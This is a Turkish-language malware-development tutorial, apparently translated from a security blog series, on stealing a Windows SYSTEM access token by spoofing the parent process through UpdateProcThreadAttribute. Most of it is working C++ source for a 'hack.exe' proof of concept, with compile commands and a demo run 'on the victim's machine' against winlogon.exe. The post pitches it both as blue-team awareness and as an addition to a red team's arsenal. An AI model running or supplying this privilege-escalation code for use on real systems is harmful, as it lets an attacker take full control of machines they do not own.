\newpage
\subsection{83. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 17 - APT teknikleri:  
UpdateProcThreadAttribute aracılığıyla belirteç hırsızlığı. Basit C++ örneği.}

﷽

Merhaba, siber güvenlik meraklıları ve beyaz şapkalı hackerlar!     

![token](./images/77/2022-10-29_03-59.png){:class="img-responsive"}    

Bu gönderi, kendi araştırmalarımın bir sonucu olup, en ilginç APT tekniklerinden biri olan UpdateProcThreadAttribute aracılığıyla belirteç hırsızlığını ele almaktadır.    

[Önceki](https://cocomelonc.github.io/tutorial/2022/09/25/token-theft-1.html) gönderimde, `DuplicateTokenEx` ve `CreateProcessWithTokenW` kullanarak klasik belirteç hırsızlığından bahsetmiştim. Bugün, Windows Vista’dan itibaren çalışan alternatif bir yöntemi anlatacağım.   

### UpdateProcThreadAttribute

Eğitimimin ilk bölümünde, klasik bir numara uyguluyoruz: `SE_DEBUG_PRIVILEGE`'i etkinleştiriyoruz, herhangi bir sistem sürecinin belirtecini açıyoruz (korunan işlemler için bile çalışır), belirteci çoğaltıyoruz, ayrıcalıkları ayarlıyoruz ve ardından bu belirteçle kimliğe bürünüyoruz.     

Bugün daha basit bir numara kullanabiliriz. Microsoft, Vista'da yeni bir işlem oluştururken açıkça bir üst işlem belirleme yeteneğini uyguladı ve bu sayede yükseltilmiş işlem, çağıran işlemin bir alt süreci olarak kalabiliyor.   

Genellikle, UAC örneğinde, yeni sürece açıkça bir belirteç vermeniz gerekir. Eğer bir belirteç sağlamazsanız, yeni süreç belirlenen üst süreçten devralır.Tek şart, üst sürecin tutamacının `PROCESS_CREATE_PROCESS` erişim ayrıcalığına sahip olmasıdır.

Bu yüzden, sadece bir sistem sürecini `PROCESS_CREATE_PROCESS` erişim hakkı ile açıyoruz. Daha sonra bu tutamacı `UpdateProcThreadAttribute` ile kullanıyoruz. Sonuç olarak, süreciniz sistem sürecinden bir belirteç devralır.     

```cpp
BOOL UpdateProcThreadAttribute(
  LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
  DWORD                        dwFlags,
  DWORD_PTR                    Attribute,
  PVOID                        lpValue,
  SIZE_T                       cbSize,
  PVOID                        lpPreviousValue,
  PSIZE_T                      lpReturnSize
);
```

Ve bunun çalışması için tek ihtiyacınız olan şey `SE_DEBUG_PRIVILEGE`'dir.    

### teknik. pratik örnek

Öncelikle, bazen mevcut ayrıcalık kümenizde `SeDebugPrivilege`'i etkinleştirmeniz gerekir:     

```cpp
// set privilege
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), 
  TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), 
  (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  printf(res ? "successfully enable %s :)\n" : 
  "failed to enable %s :(\n", priv);
  return res;
}
```

Ardından, erişim belirtecini çalmak istediğiniz süreci `PROCESS_CREATE_PROCESS` erişim haklarıyla açın:    

```cpp
HANDLE ph = OpenProcess(PROCESS_CREATE_PROCESS, false, pid);
```

Daha sonra, `UpdateProcThreadAttribute` ile bu tutamacı kullanın:    

```cpp
ZeroMemory(&si, sizeof(STARTUPINFOEXW));
ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
InitializeProcThreadAttributeList(NULL, 1, 0, &size);
si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
  GetProcessHeap(),
  0,
  size
);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
UpdateProcThreadAttribute(si.lpAttributeList, 0, 
PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);
si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
```

Son olarak, süreci oluşturun:     

```cpp
res = CreateProcessW(app, NULL, NULL, NULL, true, 
EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, 
(LPSTARTUPINFOW)&si, &pi);
printf(res ? "successfully create process :)\n" : 
"failed to create process :(\n");
```

Bu mantığın tam kaynak kodu şu şekildedir:       

```cpp
/*
hack.cpp
token theft via
UpdateProcThreadAttribute
author: @cocomelonc
https://cocomelonc.github.io/malware/2022/10/28/token-theft-2.html
*/
#include <windows.h>
#include <stdio.h>
#include <iostream>

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) 
  res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), 
  (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  printf(res ? "successfully enable %s :)\n" : 
  "failed to enable %s :(\n", 
  priv);
  return res;
}

// create process
BOOL createProcess(DWORD pid, LPCWSTR app) {
  STARTUPINFOEXW si;
  PROCESS_INFORMATION pi;
  SIZE_T size;
  BOOL res = TRUE;
  HANDLE ph = OpenProcess(PROCESS_CREATE_PROCESS, false, pid);
  printf(ph ? "successfully open process :)\n" : 
  "failed to open process :(\n");

  ZeroMemory(&si, sizeof(STARTUPINFOEXW));
  ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
  InitializeProcThreadAttributeList(NULL, 1, 0, &size);
  si.lpAttributeList = 
  (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
  InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
  UpdateProcThreadAttribute(si.lpAttributeList, 0, 
  PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);
  si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

  res = CreateProcessW(app, NULL, NULL, NULL, true, 
  EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, NULL, NULL, 
  (LPSTARTUPINFOW)&si, &pi);
  printf(res ? "successfully create process :)\n" : 
  "failed to create process :(\n");
  return res;
}

int main(int argc, char** argv) {
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  DWORD pid = atoi(argv[1]);
  if (!createProcess(pid, L"C:\\Windows\\System32\\mspaint.exe")) return -1;
  return 0;
}
```

Gördüğünüz gibi, kod önceki bölümden biraz farklıdır. Bu kod yalnızca kirli bir PoC olup, basitlik adına `mspaint.exe`'yi çalıştırıyorum.      

### demo

Her şeyi çalışırken görelim. PoC'mizi derleyelim:   

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections \
-Wno-write-strings -fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![token](./images/77/2022-10-29_03-48.png){:class="img-responsive"}    

Ardından, bunu kurbanın makinesinde çalıştıralım:    

```powershell
.\hack.exe <PID>
```

![token](./images/77/2022-10-29_03-56.png){:class="img-responsive"}    

Örneğin, `winlogon.exe` (`PID: 544`) erişim belirtecini çalabilirsiniz:     

![token](./images/77/2022-10-29_03-57.png){:class="img-responsive"}    

![token](./images/77/2022-10-29_03-58.png){:class="img-responsive"}    

![token](./images/77/2022-10-29_03-59_1.png){:class="img-responsive"}    

Gördüğünüz gibi, her şey mükemmel çalışıyor!     

Bu gönderinin en azından siber güvenlik alanına yeni başlayanlar (ve muhtemelen profesyoneller) için biraz faydalı olmasını, ayrıca mavi takım üyelerine bu ilginç teknik hakkında farkındalık kazandırmasını ve kırmızı takım üyelerinin cephaneliğine bir silah eklemesini umuyorum.     

[Local Security Authority](https://learn.microsoft.com/en-us/windows-server/security/windows-authentication/credentials-processes-in-windows-authentication)       
[Privilege Constants](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants)     
[LookupPrivilegeValue](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea)    
[AdjustTokenPrivileges](https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges)     
[UpdateProcThreadAttribute](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)    
[CreateProcessW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw)       
[APT techniques: Token theft. Part 1](/tutorial/2022/09/25/token-theft-1.html)     
[github'taki kaynak kod](https://github.com/cocomelonc/meow/tree/master/2022-10-28-token-theft-2)        
